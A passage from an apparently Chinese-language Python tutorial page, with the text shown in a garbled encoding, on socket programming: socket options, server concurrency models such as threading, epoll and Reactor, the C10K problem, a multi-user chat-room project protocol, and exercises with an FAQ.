class="code"><pre><code class="hljs python"><span class="hljs-comment"># è·å–é€‰é¡¹å€¼</span><br>value = sock.getsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;SO_REUSEADDR: <span class="hljs-subst">&#123;value&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># è·å–ç¼“å†²åŒºå¤§å°</span><br>rcvbuf = sock.getsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF)<br>sndbuf = sock.getsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æ¥æ”¶ç¼“å†²åŒº: <span class="hljs-subst">&#123;rcvbuf&#125;</span> å­—èŠ‚&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;å‘é€ç¼“å†²åŒº: <span class="hljs-subst">&#123;sndbuf&#125;</span> å­—èŠ‚&quot;</span>)<br></code></pre></td></tr></table></figure><hr><h2 id="4-é«˜æ€§èƒ½æœåŠ¡å™¨è®¾è®¡æ¨¡å¼"><a href="#4-é«˜æ€§èƒ½æœåŠ¡å™¨è®¾è®¡æ¨¡å¼" class="headerlink" title="4. é«˜æ€§èƒ½æœåŠ¡å™¨è®¾è®¡æ¨¡å¼"></a>4. é«˜æ€§èƒ½æœåŠ¡å™¨è®¾è®¡æ¨¡å¼</h2><h3 id="4-1-å¸¸è§æ¶æ„æ¨¡å¼"><a href="#4-1-å¸¸è§æ¶æ„æ¨¡å¼" class="headerlink" title="4.1 å¸¸è§æ¶æ„æ¨¡å¼"></a>4.1 å¸¸è§æ¶æ„æ¨¡å¼</h3><p><strong>1. å•çº¿ç¨‹é˜»å¡ï¼ˆæœ€ç®€å•ï¼‰</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    client, addr = server.accept()  <span class="hljs-comment"># é˜»å¡</span><br>    data = client.recv(<span class="hljs-number">1024</span>)        <span class="hljs-comment"># é˜»å¡</span><br>    client.send(response)<br>    client.close()<br><br>ä¼˜ç‚¹ï¼š<br>âœ… ä»£ç ç®€å•<br><br>ç¼ºç‚¹ï¼š<br>âŒ åŒä¸€æ—¶é—´åªèƒ½æœåŠ¡ä¸€ä¸ªå®¢æˆ·ç«¯<br>âŒ æ€§èƒ½æå·®<br><br>é€‚ç”¨ï¼š<br>- å­¦ä¹ demo<br>- æå°‘å¹¶å‘çš„åœºæ™¯<br></code></pre></td></tr></table></figure><p><strong>2. å¤šçº¿ç¨‹ï¼ˆç®€å•ä½†æœ‰é™åˆ¶ï¼‰</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_client</span>(<span class="hljs-params">client_sock</span>):<br>    data = client_sock.recv(<span class="hljs-number">1024</span>)<br>    client_sock.send(response)<br>    client_sock.close()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    client, addr = server.accept()<br>    thread = threading.Thread(target=handle_client, args=(client,))<br>    thread.start()<br><br>ä¼˜ç‚¹ï¼š<br>âœ… å¯ä»¥åŒæ—¶å¤„ç†å¤šä¸ªå®¢æˆ·ç«¯<br>âœ… ä»£ç ç›¸å¯¹ç®€å•<br><br>ç¼ºç‚¹ï¼š<br>âŒ çº¿ç¨‹å¼€é”€å¤§ï¼ˆå†…å­˜ã€ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼‰<br>âŒ æœ€å¤šå‡ åƒä¸ªçº¿ç¨‹<br>âŒ C10Ké—®é¢˜ï¼ˆ<span class="hljs-number">10000</span>å¹¶å‘ï¼‰<br><br>é€‚ç”¨ï¼š<br>- ä¸­å°è§„æ¨¡åº”ç”¨<br>- æ¯ä¸ªè¿æ¥å¤„ç†æ—¶é—´è¾ƒé•¿<br></code></pre></td></tr></table></figure><p><strong>3. å¤šè¿›ç¨‹ï¼ˆè¿›ç¨‹æ± ï¼‰</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">worker</span>(<span class="hljs-params">server_sock</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        client, addr = server_sock.accept()<br>        handle_client(client)<br><br><span class="hljs-comment"># åˆ›å»ºå¤šä¸ªå·¥ä½œè¿›ç¨‹</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    p = Process(target=worker, args=(server,))<br>    p.start()<br><br>ä¼˜ç‚¹ï¼š<br>âœ… åˆ©ç”¨å¤šæ ¸CPU<br>âœ… è¿›ç¨‹éš”ç¦»ï¼Œç¨³å®šæ€§å¥½<br><br>ç¼ºç‚¹ï¼š<br>âŒ è¿›ç¨‹å¼€é”€æ›´å¤§<br>âŒ è¿›ç¨‹æ•°é‡æœ‰é™<br>âŒ è¿›ç¨‹é—´é€šä¿¡å¤æ‚<br><br>é€‚ç”¨ï¼š<br>- CPUå¯†é›†å‹ä»»åŠ¡<br>- éœ€è¦è¿›ç¨‹éš”ç¦»<br></code></pre></td></tr></table></figure><p><strong>4. IOå¤šè·¯å¤ç”¨ + å•çº¿ç¨‹ï¼ˆé«˜æ€§èƒ½ï¼‰</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">epoll = select.epoll()<br>epoll.register(server.fileno(), select.EPOLLIN)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    events = epoll.poll()<br>    <span class="hljs-keyword">for</span> fd, event <span class="hljs-keyword">in</span> events:<br>        <span class="hljs-comment"># å¤„ç†äº‹ä»¶</span><br>        <span class="hljs-keyword">pass</span><br><br>ä¼˜ç‚¹ï¼š<br>âœ… é«˜æ€§èƒ½ï¼ˆC10Kã€C100Kï¼‰<br>âœ… èµ„æºå ç”¨å°‘<br>âœ… å•çº¿ç¨‹ï¼Œæ— é”<br><br>ç¼ºç‚¹ï¼š<br>âŒ ä»£ç å¤æ‚<br>âŒ å›è°ƒåœ°ç‹±<br><br>é€‚ç”¨ï¼š<br>- IOå¯†é›†å‹<br>- å¤§é‡å¹¶å‘è¿æ¥<br>- é«˜æ€§èƒ½è¦æ±‚<br></code></pre></td></tr></table></figure><p><strong>5. IOå¤šè·¯å¤ç”¨ + çº¿ç¨‹æ± ï¼ˆæ¨èï¼‰</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><br>executor = ThreadPoolExecutor(max_workers=<span class="hljs-number">10</span>)<br>epoll = select.epoll()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    events = epoll.poll()<br>    <span class="hljs-keyword">for</span> fd, event <span class="hljs-keyword">in</span> events:<br>        <span class="hljs-comment"># æäº¤åˆ°çº¿ç¨‹æ± å¤„ç†</span><br>        executor.submit(handle_event, fd, event)<br><br>ä¼˜ç‚¹ï¼š<br>âœ… é«˜å¹¶å‘ï¼ˆepollï¼‰<br>âœ… åˆ©ç”¨å¤šæ ¸ï¼ˆçº¿ç¨‹æ± ï¼‰<br>âœ… ä»£ç ç›¸å¯¹ç®€å•<br><br>ç¼ºç‚¹ï¼š<br>âš ï¸ éœ€è¦å¤„ç†çº¿ç¨‹å®‰å…¨<br><br>é€‚ç”¨ï¼š<br>- ç”Ÿäº§ç¯å¢ƒæ¨è<br>- IO + CPUæ··åˆè´Ÿè½½<br></code></pre></td></tr></table></figure><p><strong>6. Reactoræ¨¡å¼ï¼ˆäº‹ä»¶é©±åŠ¨ï¼‰</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Reactoræ¨¡å¼ï¼ˆTwistedã€asyncioï¼‰ï¼š<br><br>ç»„ä»¶ï¼š<br><span class="hljs-bullet">1.</span> Reactor: äº‹ä»¶å¾ªç¯<br><span class="hljs-bullet">2.</span> Handler: äº‹ä»¶å¤„ç†å™¨<br><span class="hljs-bullet">3.</span> Acceptor: æ¥å—æ–°è¿æ¥<br><br>æµç¨‹ï¼š<br><span class="hljs-bullet">1.</span> Reactorç›‘å¬äº‹ä»¶<br><span class="hljs-bullet">2.</span> äº‹ä»¶åˆ°è¾¾ â†’ è°ƒç”¨å¯¹åº”Handler<br><span class="hljs-bullet">3.</span> Handlerå¤„ç† â†’ è¿”å›Reactor<br><br>ä¼˜ç‚¹ï¼š<br>âœ… é«˜æ€§èƒ½<br>âœ… æ¡†æ¶æˆç†Ÿ<br><br>é€‚ç”¨ï¼š<br><span class="hljs-bullet">-</span> ä½¿ç”¨å¼‚æ­¥æ¡†æ¶<br><span class="hljs-bullet">-</span> asyncioã€Twistedã€Tornado<br></code></pre></td></tr></table></figure><h3 id="4-2-C10Ké—®é¢˜"><a href="#4-2-C10Ké—®é¢˜" class="headerlink" title="4.2 C10Ké—®é¢˜"></a>4.2 C10Ké—®é¢˜</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs markdown">C10K = 10000ä¸ªå¹¶å‘è¿æ¥<br><br>å†å²ï¼š<br><span class="hljs-bullet">-</span> 2000å¹´å‰ï¼šApacheä½¿ç”¨å¤šçº¿ç¨‹/å¤šè¿›ç¨‹<br><span class="hljs-bullet">-</span> é—®é¢˜ï¼š10000ä¸ªçº¿ç¨‹ â†’ å†…å­˜è€—å°½ã€ä¸Šä¸‹æ–‡åˆ‡æ¢é¢‘ç¹<br><br>è§£å†³æ–¹æ¡ˆï¼š<br><span class="hljs-bullet">1.</span> Nginx: IOå¤šè·¯å¤ç”¨ + äº‹ä»¶é©±åŠ¨<br><span class="hljs-bullet">2.</span> ä½¿ç”¨epollï¼ˆLinuxï¼‰æˆ–kqueueï¼ˆBSDï¼‰<br><span class="hljs-bullet">3.</span> éé˜»å¡IO + çŠ¶æ€æœº<br><br>ç°åœ¨ï¼š<br><span class="hljs-bullet">-</span> C10Kå·²ç»ä¸æ˜¯é—®é¢˜<br><span class="hljs-bullet">-</span> C100Kã€C1000Kï¼ˆç™¾ä¸‡å¹¶å‘ï¼‰æˆä¸ºæ–°ç›®æ ‡<br><span class="hljs-bullet">-</span> éœ€è¦æ›´å¤šä¼˜åŒ–ï¼šå†…æ ¸å‚æ•°ã€é›¶æ‹·è´ç­‰<br></code></pre></td></tr></table></figure><hr><h2 id="5-å®æˆ˜é¡¹ç›®ï¼šå¤šäººèŠå¤©å®¤"><a href="#5-å®æˆ˜é¡¹ç›®ï¼šå¤šäººèŠå¤©å®¤" class="headerlink" title="5. å®æˆ˜é¡¹ç›®ï¼šå¤šäººèŠå¤©å®¤"></a>5. å®æˆ˜é¡¹ç›®ï¼šå¤šäººèŠå¤©å®¤</h2><h3 id="5-1-é¡¹ç›®éœ€æ±‚"><a href="#5-1-é¡¹ç›®éœ€æ±‚" class="headerlink" title="5.1 é¡¹ç›®éœ€æ±‚"></a>5.1 é¡¹ç›®éœ€æ±‚</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown">åŠŸèƒ½éœ€æ±‚ï¼š<br><span class="hljs-bullet">1.</span> æ”¯æŒå¤šç”¨æˆ·åŒæ—¶åœ¨çº¿<br><span class="hljs-bullet">2.</span> ç”¨æˆ·å¯ä»¥è®¾ç½®æ˜µç§°<br><span class="hljs-bullet">3.</span> æ¶ˆæ¯å¹¿æ’­ç»™æ‰€æœ‰ç”¨æˆ·<br><span class="hljs-bullet">4.</span> æ˜¾ç¤ºç”¨æˆ·ä¸Šçº¿/ä¸‹çº¿é€šçŸ¥<br><span class="hljs-bullet">5.</span> æŸ¥çœ‹åœ¨çº¿ç”¨æˆ·åˆ—è¡¨<br><span class="hljs-bullet">6.</span> ç§èŠåŠŸèƒ½<br><span class="hljs-bullet">7.</span> æˆ¿é—´/é¢‘é“åŠŸèƒ½<br><br>æŠ€æœ¯è¦æ±‚ï¼š<br><span class="hljs-bullet">-</span> ä½¿ç”¨TCPåè®®<br><span class="hljs-bullet">-</span> ä½¿ç”¨IOå¤šè·¯å¤ç”¨ï¼ˆepoll/selectï¼‰<br><span class="hljs-bullet">-</span> æœåŠ¡å™¨å•çº¿ç¨‹<br><span class="hljs-bullet">-</span> æ”¯æŒè‡³å°‘100ä¸ªå¹¶å‘è¿æ¥<br></code></pre></td></tr></table></figure><h3 id="5-2-åè®®è®¾è®¡"><a href="#5-2-åè®®è®¾è®¡" class="headerlink" title="5.2 åè®®è®¾è®¡"></a>5.2 åè®®è®¾è®¡</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python">æ¶ˆæ¯æ ¼å¼ï¼ˆJSONï¼‰ï¼š<br><br><span class="hljs-number">1.</span> åŠ å…¥èŠå¤©å®¤<br>&#123;<br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;join&quot;</span>,<br>    <span class="hljs-string">&quot;nickname&quot;</span>: <span class="hljs-string">&quot;Alice&quot;</span><br>&#125;<br><br><span class="hljs-number">2.</span> æ™®é€šæ¶ˆæ¯<br>&#123;<br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;message&quot;</span>,<br>    <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&quot;Hello everyone!&quot;</span><br>&#125;<br><br><span class="hljs-number">3.</span> ç§èŠ<br>&#123;<br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;private&quot;</span>,<br>    <span class="hljs-string">&quot;to&quot;</span>: <span class="hljs-string">&quot;Bob&quot;</span>,<br>    <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&quot;Hi Bob!&quot;</span><br>&#125;<br><br><span class="hljs-number">4.</span> åˆ—å‡ºç”¨æˆ·<br>&#123;<br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;list_users&quot;</span><br>&#125;<br><br><span class="hljs-number">5.</span> é€€å‡º<br>&#123;<br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;quit&quot;</span><br>&#125;<br><br>æœåŠ¡å™¨å“åº”ï¼š<br>&#123;<br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;broadcast&quot;</span>,<br>    <span class="hljs-string">&quot;from&quot;</span>: <span class="hljs-string">&quot;Alice&quot;</span>,<br>    <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&quot;Hello everyone!&quot;</span>,<br>    <span class="hljs-string">&quot;timestamp&quot;</span>: <span class="hljs-string">&quot;2024-01-15 10:30:00&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-3-å·¥å…·æ¼”ç¤º"><a href="#5-3-å·¥å…·æ¼”ç¤º" class="headerlink" title="5.3 å·¥å…·æ¼”ç¤º"></a>5.3 å·¥å…·æ¼”ç¤º</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å¯åŠ¨èŠå¤©å®¤æœåŠ¡å™¨</span><br>python day18_chat_server.py --host 0.0.0.0 --port 8888<br><br><span class="hljs-comment"># å¯åŠ¨èŠå¤©å®¤å®¢æˆ·ç«¯</span><br>python day18_chat_client.py --host 127.0.0.1 --port 8888 --nickname Alice<br></code></pre></td></tr></table></figure><hr><h2 id="6-ä»Šæ—¥ç»ƒä¹ "><a href="#6-ä»Šæ—¥ç»ƒä¹ " class="headerlink" title="6. ä»Šæ—¥ç»ƒä¹ "></a>6. ä»Šæ—¥ç»ƒä¹ </h2><h3 id="ç»ƒä¹ 1ï¼šé˜»å¡vséé˜»å¡"><a href="#ç»ƒä¹ 1ï¼šé˜»å¡vséé˜»å¡" class="headerlink" title="ç»ƒä¹ 1ï¼šé˜»å¡vséé˜»å¡"></a>ç»ƒä¹ 1ï¼šé˜»å¡vséé˜»å¡</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ç¼–å†™ç¨‹åºæ¯”è¾ƒé˜»å¡å’Œéé˜»å¡socketçš„è¡Œä¸º</span><br><span class="hljs-comment"># 1. åˆ›å»ºé˜»å¡socketï¼Œæµ‹é‡recv()çš„ç­‰å¾…æ—¶é—´</span><br><span class="hljs-comment"># 2. åˆ›å»ºéé˜»å¡socketï¼Œæµ‹é‡recv()çš„è¿”å›æ—¶é—´</span><br><span class="hljs-comment"># 3. å¯¹æ¯”å·®å¼‚</span><br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 2ï¼šå®ç°selectæœåŠ¡å™¨"><a href="#ç»ƒä¹ 2ï¼šå®ç°selectæœåŠ¡å™¨" class="headerlink" title="ç»ƒä¹ 2ï¼šå®ç°selectæœåŠ¡å™¨"></a>ç»ƒä¹ 2ï¼šå®ç°selectæœåŠ¡å™¨</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ä½¿ç”¨selectå®ç°ç®€å•çš„å›æ˜¾æœåŠ¡å™¨</span><br><span class="hljs-comment"># è¦æ±‚ï¼š</span><br><span class="hljs-comment"># 1. æ”¯æŒå¤šå®¢æˆ·ç«¯åŒæ—¶è¿æ¥</span><br><span class="hljs-comment"># 2. æ¯ä¸ªå®¢æˆ·ç«¯å‘é€çš„æ•°æ®åŸæ ·è¿”å›</span><br><span class="hljs-comment"># 3. æ˜¾ç¤ºè¿æ¥/æ–­å¼€ä¿¡æ¯</span><br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 3ï¼šæ€§èƒ½æµ‹è¯•"><a href="#ç»ƒä¹ 3ï¼šæ€§èƒ½æµ‹è¯•" class="headerlink" title="ç»ƒä¹ 3ï¼šæ€§èƒ½æµ‹è¯•"></a>ç»ƒä¹ 3ï¼šæ€§èƒ½æµ‹è¯•</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ç¼–å†™å‹åŠ›æµ‹è¯•å·¥å…·</span><br><span class="hljs-comment"># 1. åˆ›å»º100ä¸ªå¹¶å‘è¿æ¥</span><br><span class="hljs-comment"># 2. æ¯ä¸ªè¿æ¥å‘é€100æ¡æ¶ˆæ¯</span><br><span class="hljs-comment"># 3. æµ‹é‡æ€»è€—æ—¶å’ŒQPS</span><br><span class="hljs-comment"># 4. å¯¹æ¯”ä¸åŒIOæ¨¡å‹çš„æ€§èƒ½</span><br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 4ï¼šèŠå¤©å®¤æ‰©å±•"><a href="#ç»ƒä¹ 4ï¼šèŠå¤©å®¤æ‰©å±•" class="headerlink" title="ç»ƒä¹ 4ï¼šèŠå¤©å®¤æ‰©å±•"></a>ç»ƒä¹ 4ï¼šèŠå¤©å®¤æ‰©å±•</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ä¸ºèŠå¤©å®¤æ·»åŠ åŠŸèƒ½ï¼š</span><br><span class="hljs-comment"># 1. ç”¨æˆ·è®¤è¯ï¼ˆç™»å½•ï¼‰</span><br><span class="hljs-comment"># 2. æ¶ˆæ¯å†å²è®°å½•</span><br><span class="hljs-comment"># 3. æ–‡ä»¶ä¼ è¾“</span><br><span class="hljs-comment"># 4. è¡¨æƒ…æ”¯æŒ</span><br></code></pre></td></tr></table></figure><hr><h2 id="7-å¸¸è§é—®é¢˜"><a href="#7-å¸¸è§é—®é¢˜" class="headerlink" title="7. å¸¸è§é—®é¢˜"></a>7. å¸¸è§é—®é¢˜</h2><p><strong>Q1ï¼šé˜»å¡å’Œéé˜»å¡çš„æœ¬è´¨åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>é˜»å¡ï¼šç³»ç»Ÿè°ƒç”¨ä¼šç­‰å¾…ï¼Œç›´åˆ°æ¡ä»¶æ»¡è¶³</li><li>éé˜»å¡ï¼šç³»ç»Ÿè°ƒç”¨ç«‹å³è¿”å›ï¼Œå¦‚æœæœªå°±ç»ªè¿”å›é”™è¯¯</li></ul><p><strong>Q2ï¼šselect&#x2F;poll&#x2F;epollåº”è¯¥é€‰å“ªä¸ªï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>Linuxç”Ÿäº§ç¯å¢ƒï¼šepollï¼ˆæ€§èƒ½æœ€å¥½ï¼‰</li><li>è·¨å¹³å°å¼€å‘ï¼šselectæˆ–poll</li><li>å°‘é‡è¿æ¥ï¼šselectå¤Ÿç”¨</li><li>å¤§é‡è¿æ¥ï¼šå¿…é¡»epoll</li></ul><p><strong>Q3ï¼šä¸ºä»€ä¹ˆepollæ¯”selectå¿«ï¼Ÿ</strong></p><p>Aï¼š</p><ol><li>selectéœ€è¦éå†æ‰€æœ‰fdï¼ˆO(n)ï¼‰ï¼Œepollåªè¿”å›å°±ç»ªçš„ï¼ˆO(1)ï¼‰</li><li>selectæ¯æ¬¡è°ƒç”¨éƒ½è¦æ‹·è´fd_setï¼Œepollä½¿ç”¨mmap</li><li>epollæ”¯æŒè¾¹ç¼˜è§¦å‘ï¼Œå‡å°‘ç³»ç»Ÿè°ƒç”¨</li></ol><p><strong>Q4ï¼šä»€ä¹ˆæ—¶å€™ç”¨å¤šçº¿ç¨‹ï¼Œä»€ä¹ˆæ—¶å€™ç”¨IOå¤šè·¯å¤ç”¨ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>IOå¯†é›†å‹ï¼šIOå¤šè·¯å¤ç”¨</li><li>CPUå¯†é›†å‹ï¼šå¤šçº¿ç¨‹&#x2F;å¤šè¿›ç¨‹</li><li>æ··åˆå‹ï¼šIOå¤šè·¯å¤ç”¨ + çº¿ç¨‹æ± </li></ul><p><strong>Q5ï¼šå¼‚æ­¥IOå’ŒIOå¤šè·¯å¤ç”¨æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>IOå¤šè·¯å¤ç”¨ï¼šåŒæ­¥éé˜»å¡ï¼Œselect&#x2F;epollé€šçŸ¥å°±ç»ª</li><li>å¼‚æ­¥IOï¼šçœŸæ­£çš„å¼‚æ­¥ï¼Œç³»ç»Ÿå®ŒæˆIOåé€šçŸ¥</li><li>Linuxçš„AIOæ”¯æŒä¸å®Œå–„ï¼Œå®é™…å¤šç”¨IOå¤šè·¯å¤ç”¨</li></ul><hr><h2 id="8-æ€»ç»“"><a href="#8-æ€»ç»“" class="headerlink" title="8. æ€»ç»“"></a>8. æ€»ç»“</h2><p>ä»Šå¤©æˆ‘ä»¬å­¦ä¹ äº†ï¼š</p><h3 id="æ ¸å¿ƒçŸ¥è¯†ç‚¹"><a href="#æ ¸å¿ƒçŸ¥è¯†ç‚¹" class="headerlink" title="æ ¸å¿ƒçŸ¥è¯†ç‚¹"></a>æ ¸å¿ƒçŸ¥è¯†ç‚¹</h3><ol><li><p><strong>é˜»å¡vséé˜»å¡</strong>ï¼š</p><ul><li>é˜»å¡ï¼šç­‰å¾…ç›´åˆ°å°±ç»ª</li><li>éé˜»å¡ï¼šç«‹å³è¿”å›ï¼Œæœªå°±ç»ªè¿”å›é”™è¯¯</li></ul></li><li><p><strong>IOå¤šè·¯å¤ç”¨</strong>ï¼š</p><ul><li>selectï¼šè·¨å¹³å°ï¼Œæœ‰é™åˆ¶</li><li>pollï¼šæ”¹è¿›çš„select</li><li>epollï¼šLinuxé«˜æ€§èƒ½ï¼ˆæ¨èï¼‰</li></ul></li><li><p><strong>Socketé€‰é¡¹</strong>ï¼š</p><ul><li>SO_REUSEADDRï¼šåœ°å€é‡ç”¨</li><li>TCP_NODELAYï¼šç¦ç”¨Nagle</li><li>SO_KEEPALIVEï¼šä¿æ´»æœºåˆ¶</li></ul></li><li><p><strong>æœåŠ¡å™¨æ¶æ„</strong>ï¼š</p><ul><li>å•çº¿ç¨‹é˜»å¡ï¼šç®€å•ä½†æ…¢</li><li>å¤šçº¿ç¨‹ï¼šç®€å•ä½†æœ‰é™</li><li>IOå¤šè·¯å¤ç”¨ï¼šé«˜æ€§èƒ½æ¨è</li><li>Reactoræ¨¡å¼ï¼šäº‹ä»¶é©±åŠ¨</li></ul></li><li><p><strong>å®æˆ˜æŠ€å·§</strong>ï¼š</p><ul><li>é€‰æ‹©åˆé€‚çš„IOæ¨¡å‹</li><li>é…ç½®Socketé€‰é¡¹</li><li>å¤„ç†å¹¶å‘è¿æ¥</li></ul></li></ol><h3 